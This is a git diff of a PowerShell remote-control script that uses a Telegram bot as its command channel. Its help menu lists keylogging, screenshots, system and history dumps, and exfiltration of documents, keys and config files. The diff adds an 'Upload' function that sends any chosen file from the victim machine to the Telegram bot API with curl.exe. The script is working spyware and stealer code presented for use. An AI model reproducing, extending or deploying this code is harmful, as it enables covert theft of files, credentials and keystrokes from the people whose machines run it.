@@ -70,6 +70,7 @@ FolderTree    : Gets Dir tree and sends it zipped
 Screenshot   : Sends a screenshot of the desktop
 Keycapture    : Capture Keystrokes and send
 Exfiltrate   : Sends files (see below for info)
+Upload      : Uploads a specific file (use -path)
 Systeminfo   : Send System info as text file
 Softwareinfo   : Send Software info as text file
 Historyinfo   : Send History info as text file
@@ -90,7 +91,6 @@ $contents = "==============================================
 ==============================================
 
 =========  Exfiltrate Command Examples ==========
-
 ( PS`> Exfiltrate -Path Documents -Filetype png )
 ( PS`> Exfiltrate -Filetype log )
 ( PS`> Exfiltrate )
@@ -105,6 +105,10 @@ log, db, txt, doc, pdf, jpg, jpeg, png,
 wdoc, xdoc, cer, key, xls, xlsx,
 cfg, conf, docx, rft.
 
+==========  Upload Command Examples ===========
+(PS`> Upload -Path C:/Path/To/File.txt)
+Use 'FolderTree' command to show all files
+
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
@@ -116,6 +120,12 @@ $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 rm -Path "$env:temp/tgc2.txt" -Force
 exit
+}
+
+Function Upload{
+param ([string[]]$Path)
+curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+Write-Output "File Upload Complete."
 }
 
 Function Exfiltrate {
